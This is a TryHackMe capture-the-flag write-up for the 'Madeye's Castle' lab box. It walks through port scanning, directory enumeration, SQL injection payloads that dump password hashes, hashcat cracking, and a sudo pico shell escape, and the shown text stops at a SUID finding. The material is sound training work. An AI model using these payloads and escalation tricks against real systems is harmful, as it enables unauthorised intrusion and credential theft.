---
title: "TryHackMe - Madeye's Castle"
categories:
  - TryHackMe
tags:
  - writeup
  - tryhackme
  - linux privesc
---
A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja

## Scanning
Scanning all ports as usual.

```bash
$ rustscan -a 10.10.14.247 --ulimit 10000 -- -A -v -PS 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.14.247:22
Open 10.10.14.247:80
Open 10.10.14.247:139
Open 10.10.14.247:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-02 08:23 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:23
Completed NSE at 08:23, 0.00s elapsed
Initiating Ping Scan at 08:23
Scanning 10.10.14.247 [1 port]
Completed Ping Scan at 08:23, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:23
Completed Parallel DNS resolution of 1 host. at 08:23, 13.01s elapsed
DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 08:23
Scanning 10.10.14.247 [4 ports]
Discovered open port 445/tcp on 10.10.14.247
Discovered open port 139/tcp on 10.10.14.247
Discovered open port 80/tcp on 10.10.14.247
Discovered open port 22/tcp on 10.10.14.247
Completed Connect Scan at 08:23, 0.18s elapsed (4 total ports)
Initiating Service scan at 08:23
Scanning 4 services on 10.10.14.247
Completed Service scan at 08:23, 11.56s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.14.247.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:23
NSE Timing: About 99.82% done; ETC: 08:24 (0:00:00 remaining)
Completed NSE at 08:24, 40.08s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.72s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:24
Completed NSE at 08:24, 0.00s elapsed
Nmap scan report for 10.10.14.247
Host is up, received syn-ack (0.18s latency).
Scanned at 2021-02-02 08:23:27 EST for 65s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSmqaAdIPmWjN3e6ubgLXXBGVvX9bKtcNHYD2epO9Fwy4brQNYRBkUxrRp4SJIX26MGxGyE8C5HKzhKdlXCeQS+QF36URayv/joz6UOTFTW3oxsMF6tDYMQy3Zcgh5Xp5yVoNGP84pegTQjXUUxhYSEhb3aCIci8JzPt9JntGuO0d0BQAqEo94K3RCx4/V7AWO1qlUeFF/nUZArwtgHcLFYRJEzonM02wGNHXu1vmSuvm4EF/IQE7UYGmNYlNKqYdaE3EYAThEIiiMrPaE4v21xi1JNNjUIhK9YpTA9kJuYk3bnzpO+u6BLTP2bPCMO4C8742UEc4srW7RmZ3qmoGt
|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDhpuUC3UgAeCvRo0UuEgWfXhisGXTVUnFooDdZzvGRS393O/N6Ywk715TOIAbk+o1oC1rba5Cg7DM4hyNtejk=
|   256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnNa6K0GzjKiPdClth/sy8rhOd8KtkuagrRkr4tiATl
80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   HOGWARTZ-CASTLE<00>  Flags: <unique><active>
|   HOGWARTZ-CASTLE<03>  Flags: <unique><active>
|   HOGWARTZ-CASTLE<20>  Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32711/tcp): CLEAN (Timeout)
|   Check 2 (port 62181/tcp): CLEAN (Timeout)
|   Check 3 (port 45213/udp): CLEAN (Timeout)
|   Check 4 (port 31963/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: hogwartz-castle
|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
|   Domain name: \x00
|   FQDN: hogwartz-castle
|_  System time: 2021-02-02T13:23:53+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-02T13:23:53
|_  start_date: N/A
```

## Enumeration
Let's run `gobuster` to scan directories and files on port 80.

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.14.247/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,jpg,png,html,css,jpeg,txt,conf,ini,bak,swp,db
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.14.247/
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     png,html,txt,ini,db,php,jpg,css,jpeg,conf,bak,swp
[+] Timeout:        10s
===============================================================
2021/02/02 08:23:55 Starting gobuster
===============================================================
/index.html (Status: 200)
/backup (Status: 301)
```

Checking `/backup`:

<a href="/assets/images/tryhackme/madeyes-castle/1.png"><img src="/assets/images/tryhackme/madeyes-castle/1.png"></a>

Forbidden :/. Let's scan the `/backup` directory using `gobuster`!

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.14.247/backup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,jpg,png,html,css,jpeg,txt,conf,ini,bak,swp,db
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.14.247/backup
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     ini,bak,db,png,html,css,jpeg,txt,php,jpg,conf,swp
[+] Timeout:        10s
===============================================================
2021/02/02 08:30:05 Starting gobuster
===============================================================
/email (Status: 200)
```

Result from `/email`:

```
Madeye,

It is done. I registered the name you requested below but changed the "s" to a "z". You should be good to go.

RME

--------
On Tue, Nov 24, 2020 at 8:54 AM Madeye Moody <ctf@madeye.ninja> wrote:
Mr. Roar M. Echo,

Sounds great! Thanks, your mentorship is exactly what we need to avoid legal troubles with the Ministry of Magic.

Magically Yours,
madeye

--------
On Tue, Nov 24, 2020 at 8:53 AM Roar May Echo <info@roarmayecho.com> wrote:
Madeye,

I don't think we can do "hogwarts" due to copyright issues, but letâ€™s go with "hogwartz", how does that sound?

Roar

--------
On Tue, Nov 24, 2020 at 8:52 AM Madeye Moody <ctf@madeye.ninja> wrote:
Dear Mr. Echo,

Thanks so much for helping me develop my castle for TryHackMe. I think it would be great to register the domain name of "hogwarts-castle.thm" for the box. I have been reading about virtual hosting in Apache and it's a great way to host multiple domains on the same server. The docs says that...

> The term Virtual Host refers to the practice of running more than one web site (such as 
> company1.example.com and company2.example.com) on a single machine. Virtual hosts can be 
> "IP-based", meaning that you have a different IP address for every web site, or "name-based", 
> meaning that you have multiple names running on each IP address. The fact that they are 
> running on the same physical server is not apparent to the end user.

You can read more here: https://httpd.apache.org/docs/2.4/vhosts/index.html

What do you think?

Thanks,
madeye`
```

Talking about vhosts... Let's add the domain to our `/etc/hosts` file!

```
---
10.10.14.247    hogwarts-castle.thm
10.10.14.247    hogwartz-castle.thm
```

Visiting the `hogwartz-castle.thm`:

<a href="/assets/images/tryhackme/madeyes-castle/2.png"><img src="/assets/images/tryhackme/madeyes-castle/2.png"></a>

Login page. Let's leave this first and try to gain more information from samba share.

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.14.247         
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Harry's Important Files
        IPC$            IPC       IPC Service (hogwartz-castle server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

We can login as `anonymous`. Let's login to the `sambashare` and download all the files.

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\10.10.14.247\\sambashare                                                                                                                               1 ⨯
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Nov 25 20:19:20 2020
  ..                                  D        0  Wed Nov 25 19:57:55 2020
  spellnames.txt                      N      874  Wed Nov 25 20:06:32 2020
  .notes.txt                          H      147  Wed Nov 25 20:19:19 2020

                9219412 blocks of size 1024. 4363904 blocks available
smb: \> get spellnames.txt
getting file \spellnames.txt of size 874 as spellnames.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> get .notes.txt
getting file \.notes.txt of size 147 as .notes.txt (0.2 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```

- spellnames.txt:

    ```
    avadakedavra
    crucio
    imperio
    morsmordre
    brackiumemendo
    confringo
    sectumsempra
    sluguluseructo
    furnunculus
    densaugeo
    locomotorwibbly
    tarantallegra
    serpensortia
    levicorpus
    flagrate
    waddiwasi
    duro
    alarteascendare
    glisseo
    locomotormortis
    petrificustotalus
    liberacorpus
    orchideous
    avis
    descendo
    aparecium
    obscuro
    incarcerous
    deprimo
    meteolojinxrecanto
    oppugno
    pointme
    deletrius
    specialisrevelio
    priorincantato
    homenumrevelio
    erecto
    colloportus
    alohomora
    sonorus
    muffliato
    relashio
    mobiliarbus
    mobilicorpus
    expulso
    reducto
    diffindo
    defodio
    capaciousextremis
    piertotumlocomotor
    confundo
    expectopatronum
    quietus
    tergeo
    riddikulus
    langlock
    impedimenta
    ferula
    lumos
    nox
    impervius
    engorgio
    salviohexia
    obliviate
    repellomuggletum
    portus
    stupefy
    rennervate
    episkey
    silencio
    scourgify
    reparo
    finiteincantatem
    protego
    expelliarmus
    wingardiumleviosa
    accio
    anapneo
    incendio
    evanesco
    aguamenti
    ```

- .notes.txt:

    ```
    Hagrid told me that spells names are not good since they will not "rock you"
    Hermonine loves historical text editors along with reading old books.
    ```

Let's continue to the login page. I noticed if i input this ' character, the server will return "Internal Server Error". I intercept the login request and save the request and use sqlmap. I'm sure this login page is vulnerable to SQL Injection.

```bash
┌──(kali㉿kali)-[~]
└─$ sqlmap -r req.txt --level 5 --risk 3 --dump    
        ___
       __H__                                                                                                                                                                 
 ___ ___[']_____ ___ ___  {1.5#stable}                                                                                                                                       
|_ -| . ["]     | .'| . |                                                                                                                                                    
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                    
      |_|V...       |_|   http://sqlmap.org                                                                                                                                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:45:25 /2021-02-02/

[08:45:25] [INFO] parsing HTTP request from 'req.txt'
[08:45:25] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[08:45:25] [INFO] resuming back-end DBMS 'sqlite' 
[08:45:25] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: user=-7806' OR 6338=6338-- esCy&password=

    Type: time-based blind
    Title: SQLite > 2.0 OR time-based blind (heavy query - comment)
    Payload: user=''' OR 7620=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=''' UNION ALL SELECT NULL,NULL,NULL,'qzqpq'||'GlfrleKMcoSMxZhYMZLiZvDZDGuMMSffZqBtNsBc'||'qpzjq'-- MrFK&password=

    Database: SQLite_masterdb
    Table: users
    [40 entries]
    +------+-------+-------+----------+
    | name | admin | notes | password |
    +------+-------+-------+----------+

---
``` 

Yep! I tried to dump the database with SQLMap and it didn't worked. So, let's try with the manual way using the guide from [here](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf).
- We will use UNION query here. Let's find the right UNION payload first.

    <a href="/assets/images/tryhackme/madeyes-castle/3.png"><img src="/assets/images/tryhackme/madeyes-castle/3.png"></a>

- Enumerate tables.

    <a href="/assets/images/tryhackme/madeyes-castle/4.png"><img src="/assets/images/tryhackme/madeyes-castle/4.png"></a>

- Since we already know the columns, let's see the password column.

    <a href="/assets/images/tryhackme/madeyes-castle/5.png"><img src="/assets/images/tryhackme/madeyes-castle/5.png"></a>

    - Result:

        ```json
        {"error":"The password for 
        c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492-
        b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885-
        e1ed732e4aa925f0bf125ae8ed17dd2d5a1487f9ff97df63523aa481072b0b5ab7e85713c07e37d9f0c6f8b1840390fc713a4350943e7409a8541f15466d8b54-
        5628255048e956c9659ed4577ad15b4be4177ce9146e2a51bd6e1983ac3d5c0e451a0372407c1c7f70402c3357fc9509c24f44206987b1a31d43124f09641a8d-
        2317e58537e9001429caf47366532d63e4e37ecd363392a80e187771929e302922c4f9d369eda97ab7e798527f7626032c3f0c3fd19e0070168ac2a82c953f7b-
        79d9a8bef57568364cc6b4743f8c017c2dfd8fd6d450d9045ad640ab9815f18a69a4d2418a7998b4208d509d8e8e728c654c429095c16583cbf8660b02689905-
        e3c663d68c647e37c7170a45214caab9ca9a7d77b1a524c3b85cdaeaa68b2b5e740357de2508142bc915d7a16b97012925c221950fb671dd513848e33c33d22e-
        d3ccca898369a3f4cf73cbfc8daeeb08346edf688dc9b7b859e435fe36021a6845a75e4eddc7a932e38332f66524bd7876c0c613f620b2030ed2f89965823744-
        dc2a6b9462945b76f333e075be0bc2a9c87407a3577f43ba347043775a0f4b5c1a78026b420a1bf7da84f275606679e17ddc26bceae25dad65ac79645d2573c0-
        6535ee9d2b8d6f2438cf92da5a00724bd2539922c83ca19befedbe57859ceafd6d7b9db83bd83c26a1e070725f6f336e21cb40295ee07d87357c34b6774dd918-
        93b4f8ce01b44dd25c134d0517a496595b0b081cef6eb625e7eb6662cb12dd69c6437af2ed3a5972be8b05cc14a16f46b5d11f9e27e6550911ed3d0fe656e04d-
        9a311251255c890692dc84b7d7d66a1eefc5b89804cb74d16ff486927014d97502b2f790fbd7966d19e4fbb03b5eb7565afc9417992fc0c242870ea2fd863d6d-
        5ed63206a19b036f32851def04e90b8df081071aa8ca9fb35ef71e4daf5e6c6eab3b3fea1b6e50a45a46a7aee86e4327f73a00f48deb8ae2bf752f051563cc8b-
        87ac9f90f01b4b2ae775a7cb96a8a04d7ab7530282fd76224ee03eecab9114275540e4b6a2c52e890cf11f62aacb965be0c53c48c0e51bf731d046c5c3182aad-
        88344d6b7724bc0e6e3247d4912fa755a5a91c2276e08610462f6ea005d16fd5e305dfe566e7f1dd1a98afe1abfa38df3d9697cdc47ecbb26ac4d21349d09ba7-
        7f67af71e8cbb7188dd187b7da2386cc800ab8b863c9d0b2dce87c98a91b5511330a2ad4f7d73592b50a2a26c26970cfbd22f915d1967cd92569dbf5e24ac77e-
        8c8702dbb6de9829bcd6da8a47ab26308e9db7cb274b354e242a9811390462a51345f5101d7f081d36eea4ec199470162775c32cb1f4a96351dc385711619671-
        c809b40b7c3c0f095390f3cd96bb13864b7e8fd1670c6b1c05b1e26151be62782b97391b120cb4a8ee1d0c9b8fffaf12b44c9d084ae6041468ad5f12ec3d7a4e-
        68b519187b9e2552d555cb3e9183711b939f94dfe2f71bda0172ee8402acf074cc0f000611d68d2b8e9502fa7235c8a25d72da50916ad0689e00cb4f47283e9b-
        7eea93d53fbed3ba8f2fa3d25c5f16fe5eaff1f5371918e0845d2076a2e952a457390ad87d289bf25f9457032f14bb07dcd625d03f2f5ee5c887c09dc7107a66-
        e49608634f7de91d19e5e1b906e10c5a4a855a4fe32521f310727c9875e823c82b3e0347b32ef49ea44657e60e771d9e326d40ab60ce3a950145f1a7a79d3124-
        c063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dab-
        487daab566431e86172ed68f0836f3221592f91c94059a725d2fdca145f97e6258593929c37d0339ca68614a52f4df61953b930585c4968cedaaa836744c52a6-
        44b1fbcbcd576b8fd69bf2118a0c2b82ccf8a6a9ef2ae56e8978e6178e55b61d491f6fc152d07f97ca88c6b7532f25b8cd46279e8a2c915550d9176f19245798-
        a86fa315ce8ed4d8295bf6d0139f23ba80e918a54a132e214c92c76768f27ce002253834190412e33c9af4ea76befa066d5bdeb47363f228c509b812dc5d81df-
        a1f6e38be4bf9fd307efe4fe05522b8c3a9e37fc2c2930507e48cb5582d81f73814ffb543cef77b4b24a18e70e2670668d1a5b6e0b4cb34af9706890bd06bbc9-
        01529ec5cb2c6b0300ed8f4f3df6b282c1a68c45ff97c33d52007573774014d3f01a293a06b1f0f3eb6e90994cb2a7528d345a266203ef4cd3d9434a3a033ec0-
        d17604dbb5c92b99fe38648bbe4e0a0780f2f4155d58e7d6eddd38d6eceb62ae81e5e31a0a2105de30ba5504ea9c75175a79ed23cd18abcef0c8317ba693b953-
        ac67187c4d7e887cbaccc625209a8f7423cb4ad938ec8f50c0aa5002e02507c03930f02fab7fab971fb3f659a03cd224669b0e1d5b5a9098b2def90082dfdbd2-
        134d4410417fb1fc4bcd49abf4133b6de691de1ef0a4cdc3895581c6ad19a93737cd63cb8d177db90bd3c16e41ca04c85d778841e1206193edfebd4d6f028cdb-
        afcaf504e02b57f9b904d93ee9c1d2e563d109e1479409d96aa064e8fa1b8ef11c92bae56ddb54972e918e04c942bb3474222f041f80b189aa0efd22f372e802-
        6487592ed88c043e36f6ace6c8b6c59c13e0004f9751b0c3fdf796b1965c48607ac3cc4256cc0708e77eca8e2df35b668f5844200334300a17826c033b03fe29-
        af9f594822f37da8ed0de005b940158a0837060d3300be014fe4a12420a09d5ff98883d8502a2aaffd64b05c7b5a39cdeb5c57e3005c3d7e9cadb8bb3ad39ddb-
        53e7ea6c54bea76f1d905889fbc732d04fa5d7650497d5a27acc7f754e69768078c246a160a3a16c795ab71d4b565cde8fdfbe034a400841c7d6a37bdf1dab0d-
        11f9cd36ed06f0c166ec34ab06ab47f570a4ec3f69af98a3bb145589e4a221d11a09c785d8d3947490ae4cd6f5b5dc4eb730e4faeca2e1cf9990e35d4b136490-
        9dc90274aef30d1c017a6dc1d5e3c07c8dd6ae964bcfb95cadc0e75ca5927faa4d72eb01836b613916aea2165430fc7592b5abb19b0d0b2476f7082bfa6fb760-
        4c968fc8f5b72fd21b50680dcddea130862c8a43721d8d605723778b836bcbbc0672d20a22874af855e113cba8878672b7e6d4fc8bf9e11bc59d5dd73eb9d10e-
        d4d5f4384c9034cd2c77a6bee5b17a732f028b2a4c00344c220fc0022a1efc0195018ca054772246a8d505617d2e5ed141401a1f32b804d15389b62496b60f24-
        36e2de7756026a8fc9989ac7b23cc6f3996595598c9696cca772f31a065830511ac3699bdfa1355419e07fd7889a32bf5cf72d6b73c571aac60a6287d0ab8c36-
        8f45b6396c0d993a8edc2c71c004a91404adc8e226d0ccf600bf2c78d33ca60ef5439ccbb9178da5f9f0cfd66f8404e7ccacbf9bdf32db5dae5dde2933ca60e6 
        is incorrect! 4"}
        ```

- Enumerate more columns.

    ```bash
    # Name
    {"error":"The password for Lucas Washington-Harry Turner-Andrea Phillips-Liam Hernandez-Adam Jenkins-Landon Alexander-Kennedy Anderson-Sydney Wright-Aaliyah Sanders-Olivia Murphy-Olivia Ross-Grace Brooks-Jordan White-Diego Baker-Liam Ward-Carlos Barnes-Carlos Lopez-Oliver Gonzalez-Sophie Sanchez-Maya Sanders-Joshua Reed-Aaliyah Allen-Jasmine King-Jonathan Long-Samuel Anderson-Julian Robinson-Gianna Harris-Madelyn Morgan-Ella Garcia-Zoey Gonzales-Abigail Morgan-Joseph Rivera-Elizabeth Cook-Parker Cox-Savannah Torres-Aaliyah Williams-Blake Washington-Claire Miller-Brody Stewart-Kimberly Murphy is incorrect! 4"}

    # Admin
    {"error":"The password for 0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0 is incorrect! 4"}

    # Notes
    {"error":"The password for contact administrator. Congrats on SQL injection... keep digging-My linux username is my first name, and password uses best64- contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging-contact administrator. Congrats on SQL injection... keep digging- contact administrator. Congrats on SQL injection... keep digging is incorrect! 4"}
    ```

The password is best64??? Let's search for it. It's `rules` from [hashcat](https://github.com/hashcat/hashcat/blob/master/rules/best64.rule). 

## Gaining Access
Let's crack the password (the second row only).

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1700  hash spellnames.txt -r /usr/share/hashcat/rules/best64.rule                                                                                       255 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 2172/2236 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: spellnames.txt
* Passwords.: 81
* Bytes.....: 874
* Keyspace..: 6237
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA2-512
Hash.Target......: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd6...c5c885
Time.Started.....: Tue Feb  2 10:23:00 2021 (0 secs)
Time.Estimated...: Tue Feb  2 10:23:00 2021 (0 secs)
Guess.Base.......: File (spellnames.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   129.2 kH/s (0.34ms) @ Accel:512 Loops:77 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 6237/6237 (100.00%)
Rejected.........: 0/6237 (0.00%)
Restore.Point....: 0/81 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidates.#1....: avadakedavra -> aentia

Started: Tue Feb  2 10:22:34 2021
Stopped: Tue Feb  2 10:23:01 2021
```

We have the username (harry) and the password (wingardiumleviosa123). Let's SSH to the machine.

```bash
┌──(kali㉿kali)-[~]
└─$ ssh harry@10.10.14.247                                                                                                                                               1 ⨯
The authenticity of host '10.10.14.247 (10.10.14.247)' can't be established.
ECDSA key fingerprint is SHA256:tqvs4QmNV2BNfZVq42KFIsFtERVf7F4W5ziragiTf/0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.14.247' (ECDSA) to the list of known hosts.
harry@10.10.14.247's password: 
 _      __    __                     __         __ __                          __
 | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
 | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
 |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
                                                        /___/

Last login: Thu Nov 26 01:42:18 2020
harry@hogwartz-castle:~$
```

User1.txt:

```bash
harry@hogwartz-castle:~$ cat user1.txt 
RME{REDACTED}
```

## Escalation
Checking sudo privileges.

```bash
harry@hogwartz-castle:~$ sudo -l
[sudo] password for harry: 
Matching Defaults entries for harry on hogwartz-castle:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry may run the following commands on hogwartz-castle:
    (hermonine) /usr/bin/pico
    (hermonine) /usr/bin/pico
```

We can run `pico` as `hermonine` with sudo. Let's use it to escalate our privs.

```
harry@hogwartz-castle:~$ sudo -u hermonine pico
^R^X
reset; sh 1>&0 2>&0
hermonine@hogwartz-castle:~$ whoami
hermonine
```

User2.txt:

```bash
hermonine@hogwartz-castle:/home/hermonine$ ls
user2.txt
hermonine@hogwartz-castle:/home/hermonine$ cat user2.txt 
RME{REDACTED}
```

Running linpeas and i found interesting SUID.

```bash
...
